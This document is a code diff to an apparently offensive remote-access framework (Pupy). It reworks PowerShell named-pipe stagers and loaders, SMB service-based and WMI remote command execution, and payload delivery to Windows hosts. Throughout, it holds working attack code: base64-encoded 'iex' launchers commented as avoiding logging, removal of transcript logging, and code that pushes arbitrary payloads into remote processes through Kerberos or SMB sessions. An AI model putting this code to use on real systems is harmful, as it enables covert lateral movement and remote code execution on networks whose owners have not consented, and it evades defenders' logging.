@@ -88,31 +88,22 @@ $x.Close();
 '''
 
 PIPE_STAGER_TEMPLATE = '''
-Start-Transcript -Path "C:\\temp\\stager.log.1" -Force;
-
 $p=new-object System.IO.Pipes.NamedPipeServerStream("{pipename}","In",2,"Byte",0,{size},0);
 $p.WaitForConnection();
-$x=new-object System.IO.StringReader($p);
-$StartInfo = New-Object System.Diagnostics.ProcessStartInfo -Property @{{
-    FileName = 'powershell.exe';
-    Arguments = '-';
-    UseShellExecute = $false;
-    RedirectStandardInput = $true;
+$pr = New-Object System.Diagnostics.Process -Property @{{
+    StartInfo = New-Object System.Diagnostics.ProcessStartInfo -Property @{{
+        FileName = '{powershell}';
+        UseShellExecute = $false;
+        RedirectStandardInput = $true;
+        WindowStyle = 1;
+    }};
 }};
-$Process = New-Object System.Diagnostics.Process;
-$Process.StartInfo = $StartInfo;
-$Process.Start();
-
-$Process.StandardInput.WriteLine($x.ReadToEnd());
-$Process.StandardInput.Close();
-
-Write-Host "Launched: PID: $($Process.Id) RC: $($Process.ExitCode)";
-
-Stop-Transcript;
+$pr.Start();
+$p.CopyTo($pr.StandardInput.BaseStream);
+$pr.StandardInput.Close();
 '''
 
 PIPE_STDOUT_TEMPLATE = '''
-Start-Transcript -Path "C:\\temp\\wrapper.log" -Force;
 $p=new-object System.IO.Pipes.NamedPipeServerStream("{pipename}","Out",2,"Byte",0,0,{size});
 $p.WaitForConnection();
 $x=new-object System.IO.BinaryWriter($p);
@@ -120,6 +111,7 @@ $StartInfo = New-Object System.Diagnostics.ProcessStartInfo -Property @{{
     FileName = '{arg0}';
     Arguments = '{argv}';
     UseShellExecute = $false;
+    RedirectStandardInput = $true;
     RedirectStandardOutput = $true;
     RedirectStandardError = $true;
 }};
@@ -130,21 +122,30 @@ $Process.StartInfo = $StartInfo;
 $enc = [system.Text.Encoding]::UTF8;
 
 $OutEvent = Register-ObjectEvent -Action {{
-    $bytes = $enc.GetBytes($Event.SourceEventArgs.Data);
-    Write-Host $Event.SourceEventArgs.Data;
-    $x.Write($bytes);
-    $x.Flush();
+    $d=$Event.SourceEventArgs.Data;
+    if (![string]::IsNullOrEmpty($d)) {{
+        $d.Split([Environment]::NewLine) | Foreach {{
+            $x.Write($enc.GetBytes($_));
+            $x.Write([Char](10));
+        }};
+        $x.Flush();
+    }}
 }} -InputObject $Process -EventName OutputDataReceived;
 
 $ErrEvent = Register-ObjectEvent -Action {{
-    Write-Host $Event.SourceEventArgs.Data;
-    $x.Write($enc.GetBytes($Event.SourceEventArgs.Data));
-    $x.Flush();
+    $d=$Event.SourceEventArgs.Data;
+    if (![string]::IsNullOrEmpty($d)) {{
+        $d.Split([Environment]::NewLine) | Foreach {{
+            $x.Write($enc.GetBytes($_));
+            $x.Write([Char](10));
+        }};
+        $x.Flush();
+    }}
 }} -InputObject $Process -EventName ErrorDataReceived;
 
 $Process.Start();
-$Process.WaitForExit();
 
+$Process.StandardInput.Close();
 $Process.BeginOutputReadLine();
 $Process.BeginErrorReadLine();
 
@@ -162,7 +163,8 @@ $x.Close();
 
 POWERSHELL_CMD_TEMPLATE_STD = '{powershell} -version 2 -noninteractive -EncodedCommand "{cmd}"'
 # Avoid logging (a bit)
-POWERSHELL_CMD_TEMPLATE_CMD = 'cmd /c echo iex([System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("{cmd}"))) | powershell'
+POWERSHELL_CMD_TEMPLATE_CMD = 'cmd.exe /Q /D /S /c "echo:iex([System.Text.Encoding]::ASCII.GetString(' \
+    '[Convert]::FromBase64String("{cmd}"))) | {powershell}"'
 
 POWERSHELL_PATH = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
 
@@ -185,26 +187,26 @@ if 'idna' not in encodings._cache or not encodings._cache['idna']:
     encodings._cache['idna'] = encodings.idna.getregentry()
 
 
-def generate_loader_cmd(size):
-    pipename = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in xrange(10))
-    encoded = b64encode(PIPE_LOADER_TEMPLATE.format(pipename=pipename, size=size))
-    cmd = POWERSHELL_CMD_TEMPLATE_CMD.format(powershell=POWERSHELL_PATH, cmd=encoded)
-    return cmd, pipename
-
-
-def generate_stager_cmd():
+def generate_stager_cmd(size=1024):
     pipename = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in xrange(10))
     encoded = b64encode(PIPE_STAGER_TEMPLATE.format(
-        pipename=pipename, size=1024))
+        pipename=pipename, size=size, powershell=POWERSHELL_PATH))
     cmd = POWERSHELL_CMD_TEMPLATE_CMD.format(powershell=POWERSHELL_PATH, cmd=encoded)
     return cmd, pipename
+
+
+def generate_loader_payload(size):
+    pipename = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in xrange(10))
+    payload = PIPE_LOADER_TEMPLATE.format(pipename=pipename, size=size)
+    return payload, pipename
 
 
 def generate_stdo_payload(arg0, argv):
+    argv = ' '.join(argv)
     pipename = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in xrange(10))
     payload = PIPE_STDOUT_TEMPLATE.format(
-        pipename=pipename, size=1024, arg0=arg0, argv=' '.join(argv))
-    return payload, pipename
+        pipename=pipename, size=1024, arg0=arg0, argv=argv)
+    return payload, pipename, arg0, argv
 
 
 class ConnectionInfo(object):
@@ -441,13 +443,13 @@ class ConnectionInfo(object):
 
         return rpc
 
-    def create_smb_connection(self):
-        if self._smb_conn:
+    def create_smb_connection(self, force=False):
+        if self._smb_conn and not force:
             return self._smb_conn
 
         key = None
 
-        if self._use_cache:
+        if self._use_cache and not force:
             key = self._cache_key_entry()
             if key in SMB_SESSIONS_CACHE:
                 self._smb_conn = SMB_SESSIONS_CACHE[key]
@@ -476,9 +478,10 @@ class ConnectionInfo(object):
                 tgt=self.TGT, tgs=self.TGS, kdc=self.KDC
             )
 
-            self._smb_conn = smb
+            if not force:
+                self._smb_conn = smb
 
-            if key is not None:
+            if key is not None and not force:
                 SMB_SESSIONS_CACHE[key] = self._smb_conn
 
             return smb
@@ -712,7 +715,7 @@ class ShellServiceIsNotExists(Exception):
 
 class ShellService(object):
     __slots__ = (
-        '_scHandle', '_serviceHandle', '_scmr', '_name', '_stdout', '_command'
+        '_scHandle', '_serviceHandle', '_scmr', '_name', '_command'
     )
 
     def __init__(self, rpc, name=SERVICE_NAME):
@@ -723,7 +726,6 @@ class ShellService(object):
 
         self._scmr = rpc
         self._scmr.bind(scmr.MSRPC_UUID_SCMR)
-        self._stdout = None
 
         resp = scmr.hROpenSCManagerW(self._scmr)
         self._scHandle = resp['lpScHandle']
@@ -741,19 +743,9 @@ class ShellService(object):
             else:
                 raise
 
-    def create(self, command, stdout=False):
+    def create(self, command):
         if self._serviceHandle:
             raise ShellServiceAlreadyExists()
-
-        if stdout:
-            argv0 = command
-            argv = []
-
-            if ' ' in command:
-                parts = command.split(' ', 1)
-                argv0, argv = parts[0], parts[1:]
-
-            command, self._stdout = payload(argv0, argv)
 
         if not command.endswith('\x00'):
             command += '\x00'
@@ -782,8 +774,6 @@ class ShellService(object):
 
             raise
 
-        return self.status() == scmr.SERVICE_RUNNING
-
     def status(self):
         if not self._serviceHandle:
             raise ShellServiceIsNotExists()
@@ -802,10 +792,6 @@ class ShellService(object):
     @property
     def name(self):
         return self._name
-
-    @property
-    def stdout(self):
-        return self._stdout
 
     @property
     def exists(self):
@@ -853,9 +839,28 @@ def sc(conninfo, command, output=True, on_data=None, on_exec=None):
     rpc = conninfo.create_pipe_dce_rpc(r'\pipe\svcctl')
     ft = None
 
+    payload = None
+    stdout = None
+    stager_pipe = None
+
+    if output:
+        argv0 = command
+        argv = []
+
+        if ' ' in command:
+            parts = command.split(' ', 1)
+            argv0, argv = parts[0], parts[1:]
+
+        payload, stdout, arg0, argv = generate_stdo_payload(argv0, argv)
+        command, stager_pipe = generate_stager_cmd(len(payload))
+
+        if on_data:
+            on_data(False, 'Wrapped: arg0={} argv={}'.format(arg0, argv))
+
     if on_data:
         on_data(False, 'Connected to svcctl')
 
+    starter = None
     service = ShellService(rpc)
 
     if on_data:
@@ -867,7 +872,16 @@ def sc(conninfo, command, output=True, on_data=None, on_exec=None):
 
         service.destroy()
 
-    if not service.create(command, output):
+    if command.startswith(('cmd ', 'cmd.exe')):
+        # zOMG Need to have double encoded shit
+        # In other cases some God-Knows-What happend with pipes/stdo etc
+        command = 'cmd.exe /Q /D /S /c "' + command.replace(
+            '"', '^"'
+        ).replace(
+            '|', '^|'
+        ) + '"'
+
+    if not service.create(command):
         raise PsExecException('Could not create service')
 
     try:
@@ -882,63 +896,90 @@ def sc(conninfo, command, output=True, on_data=None, on_exec=None):
 
         output_data = []
 
-        now = time.time()
-        service.start()
-
         if output:
-            if not service.active:
-                if on_data:
-                    on_data(False, 'Service {} is not started (status={} delay={})'.format(
-                        service.name,
-                        SERVICE_STATUS_STR.get(service.status(), 'UNKNOWN'),
-                        time.time() - now))
-                raise PsExecException('Service is dead')
+            # Service start will block, so we'll do that in separate thread
+            starter = Thread(target=service.start)
+            starter.daemon = True
+            starter.start()
+
+            if on_data:
+                on_data(False, 'Service {} (hopefully) started'.format(service.name))
 
             ft = FileTransfer(
-                conninfo.create_smb_connection(), conninfo.cached
+                conninfo.create_smb_connection(
+                    # We need new connection, because previous one is blocked
+                    force=True
+                ), False
             )
 
-            if on_exec:
-                on_exec(ft)
-
             if on_data:
-                on_data(False, 'Connecting to stdout (pipe={})'.format(service.stdout))
+                on_data(False, 'New connection to {}'.format(ft.info))
 
-            with ft.open_pipe(service.stdout, FILE_READ_DATA, conninfo.timeout) as pipe:
+            try:
                 if on_data:
-                    on_data(False, 'Connected to stdout')
+                    on_data(False, 'Connecting to stager (pipe={})'.format(stager_pipe))
 
-                while service.active:
-                    chunk = pipe.read(1024)
-                    if not chunk:
-                        break
-
+                with ft.open_pipe(stager_pipe, FILE_WRITE_DATA | FILE_APPEND_DATA, conninfo.timeout) as pipe:
                     if on_data:
-                        on_data(True, chunk)
-                    else:
-                        output_data.append(chunk)
+                        on_data(False, 'Connected to the stager pipe')
 
-                    if timeout is not None and time.time() >= timeout:
-                        break
+                    pipe.write(payload)
+
+                if on_exec:
+                    on_exec(ft)
+
+                if on_data:
+                    on_data(False, 'Connecting to stdout (pipe={})'.format(stdout))
+
+                with ft.open_pipe(stdout, FILE_READ_DATA, conninfo.timeout) as pipe:
+                    if on_data:
+                        on_data(False, 'Connected to stdout')
+
+                    while True:
+                        chunk = pipe.read(1024)
+                        if not chunk:
+                            break
+
+                        if '\r\n' in chunk:
+                            chunk = chunk.replace('\r\n', '\n')
+
+                        if on_data:
+                            on_data(True, chunk)
+                        else:
+                            output_data.append(chunk)
+
+                        if timeout is not None and time.time() >= timeout:
+                            break
+            finally:
+                ft.close()
 
         else:
-            if on_data:
-                on_data(False, 'Service {} started. Waiting {} sec'.format(
-                    service.name, conninfo.timeout))
-
             if on_exec:
+                starter = Thread(target=service.start)
+                starter.daemon = True
+                starter.start()
+
                 ft = FileTransfer(
-                    conninfo.create_smb_connection(), conninfo.cached
+                    conninfo.create_smb_connection(
+                        # We need new connection, because previous one is blocked
+                        force=True
+                    ), False
                 )
 
-                on_exec(ft)
+                try:
+                    on_exec(ft)
+                finally:
+                    ft.close()
+            else:
+                service.start()
 
-            while not service.stopped:
-                if timeout is not None and time.time() >= timeout:
-                    break
-
-                time.sleep(1)
     finally:
+        if starter is not None:
+            if on_data:
+                on_data(False, 'Waiting start completion {}'.format(service.name))
+
+            starter.join()
+
         if on_data:
             on_data(False, 'Destroying service {}'.format(service.name))
 
@@ -973,12 +1014,14 @@ def wmiexec(conninfo, command, output=True, on_data=None, on_exec=None):
     ft = None
 
     if output:
-        stager, stager_pipe = generate_stager_cmd()
-
         parts = command.split(' ', 1)
         argv0, argv = parts[0], parts[1:]
 
-        payload, stdout = generate_stdo_payload(argv0, argv)
+        payload, stdout, arg0, argv = generate_stdo_payload(argv0, argv)
+        if on_data:
+            on_data(False, 'Wrapped: arg0={} argv={}'.format(arg0, argv))
+
+        stager, stager_pipe = generate_stager_cmd(len(payload))
 
         ft = FileTransfer(
             conninfo.create_smb_connection(), conninfo.cached
@@ -992,6 +1035,15 @@ def wmiexec(conninfo, command, output=True, on_data=None, on_exec=None):
         if on_data:
             on_data(False, '{} -> {}'.format(stager, iResultClassObject.ProcessId))
 
+        if on_data:
+            on_data(False, 'Connecting to the stager pipe (pipe={})'.format(stager_pipe))
+
+        with ft.open_pipe(stager_pipe, FILE_WRITE_DATA | FILE_APPEND_DATA, conninfo.timeout) as pipe:
+            if on_data:
+                on_data(False, 'Connected to the stager pipe')
+
+            pipe.write(payload)
+
         if on_exec:
             ft = FileTransfer(
                 conninfo.create_smb_connection(), conninfo.cached
@@ -999,15 +1051,6 @@ def wmiexec(conninfo, command, output=True, on_data=None, on_exec=None):
 
             on_exec(ft)
 
-        if on_data:
-            on_data(False, 'Connecting to the stager pipe (pipe={})'.format(stager_pipe))
-
-        with ft.open_pipe(stager_pipe, FILE_WRITE_DATA | FILE_APPEND_DATA, conninfo.timeout) as pipe:
-            if on_data:
-                on_data(False, 'Connected to the stager pipe'.format(stager_pipe))
-            
-            pipe.write(payload)
-        
         if on_data:
             on_data(False, 'Connecting to stdout (pipe={})'.format(stdout))
 
@@ -1115,8 +1158,6 @@ def _psexec(
         codepage=None, output=True,
         on_exec=None, on_data=None, on_complete=None, verbose=False):
 
-    result = None
-
     if on_data and verbose:
         on_data('PSExec thread started')
 
@@ -1131,23 +1172,19 @@ def _psexec(
     try:
         with conninfo:
             if execm == 'smbexec':
-                result, ft = sc(
+                sc(
                     conninfo, command, output, _on_data if on_data else None,
                     on_exec
                 )
 
             elif execm == 'wmi':
-                result, ft = wmiexec(
+                wmiexec(
                     conninfo, command, output, _on_data if on_data else None,
                     on_exec
                 )
 
             else:
                 raise ValueError('Unknown execution method, knowns are smbexec/wmi')
-
-            if result:
-                if codepage:
-                    result = result.decode(codepage)
 
     except PsExecException as e:
         if on_complete:
@@ -1248,7 +1285,9 @@ def pupy_smb_exec(
     timeout=90, log_cb=None):
 
     size = len(payload)
-    cmd, pipename = generate_loader_cmd(size)
+
+    loader_payload, loader_pipename = generate_loader_payload(size)
+    stager_cmd, stager_pipename = generate_stager_cmd(len(loader_payload))
 
     def _psexec_log(data):
         if log_cb:
@@ -1257,7 +1296,7 @@ def pupy_smb_exec(
     def _loader():
         if log_cb:
             log_cb(None, 'Thread started (pipe={}, payload={}, md5={})'.format(
-                pipename, size, md5(payload).hexdigest()))
+                loader_pipename, size, md5(payload).hexdigest()))
 
         def _on_complete(error):
             if log_cb:
@@ -1273,7 +1312,20 @@ def pupy_smb_exec(
                     ft.info))
 
             try:
-                ft.push_to_pipe(pipename, payload, timeout=timeout)
+                ft.push_to_pipe(stager_pipename, loader_payload, timeout=timeout)
+                if log_cb:
+                    log_cb(None, 'Stager flushed')
+
+            except Exception, e:
+                if log_cb:
+                    import traceback
+                    log_cb(None, '{}: {}'.format(
+                        e, traceback.format_exc()))
+
+                return
+
+            try:
+                ft.push_to_pipe(loader_pipename, payload, timeout=timeout)
                 if log_cb:
                     log_cb(None, 'Payload flushed')
 
@@ -1290,7 +1342,7 @@ def pupy_smb_exec(
 
             _psexec(
                 conninfo,
-                cmd, execm=execm,
+                stager_cmd, execm=execm,
                 output=False,
                 on_exec=_push_payload,
                 on_data=_psexec_log,
@@ -1307,10 +1359,10 @@ def pupy_smb_exec(
 
     worker = Thread(
         target=_loader,
-        name='PowerLoader [smb] (pipe={}, timeout={})'.format(
-            pipename, timeout)
+        name='PowerLoader [smb] (stager pipe={}, loader pipe={}, timeout={})'.format(
+            stager_pipename, loader_pipename, timeout)
     )
     worker.daemon = True
     worker.start()
 
-    return cmd, pipename
+    return stager_cmd, loader_pipename
